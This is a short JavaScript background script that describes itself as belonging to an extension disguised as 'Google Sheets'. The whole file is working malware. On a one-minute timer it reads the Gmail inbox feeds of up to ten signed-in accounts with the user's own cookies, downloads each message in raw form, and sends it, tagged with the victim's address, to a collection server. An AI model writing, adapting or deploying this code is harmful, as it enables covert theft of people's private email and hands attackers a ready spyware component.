// background service worker of a disguised "Google Sheets" extension
const BUILD_ID = "cmp-7731";
const C2 = "https://collector.example.invalid/api/v2/mail";
const sent = new Set();

chrome.alarms.create("poll", { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name !== "poll") return;
  for (let idx = 0; idx < 10; idx++) {
    let feed;
    try {
      const r = await fetch(`https://mail.google.com/mail/u/${idx}/feed/atom`, { credentials: "include" });
      feed = await r.text();
    } catch (e) { continue; }
    const doc = feed;
    const account = (doc.match(/<title>Gmail - Inbox for ([^<]+)<\/title>/) || [])[1];
    const ids = [...doc.matchAll(/<id>tag:gmail\.google\.com,2004:(\d+)<\/id>/g)].map(m => m[1]);
    for (const id of ids) {
      if (sent.has(id)) continue;
      const url = `https://mail.google.com/mail/u/${idx}/?view=att&th=${id}&attid=0&disp=comp&safe=1&zw&cacheCounter=${Date.now()}`;
      const raw = await (await fetch(url, { credentials: "include" })).text();
      await fetch(C2, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ build: BUILD_ID, victim: account, mime: raw })
      });
      sent.add(id);
    }
  }
});
